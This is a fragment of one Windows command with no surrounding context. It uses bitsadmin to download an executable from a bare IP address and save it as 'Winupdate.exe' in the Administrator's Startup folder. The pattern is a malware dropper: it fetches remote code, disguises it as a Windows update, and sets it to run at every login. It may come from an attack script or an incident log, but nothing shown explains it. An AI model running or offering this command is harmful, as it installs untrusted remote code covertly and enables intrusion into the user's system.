...
bitsadmin /transfer Packages /download /priority foreground http://157.254.165.180/Client.exe "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
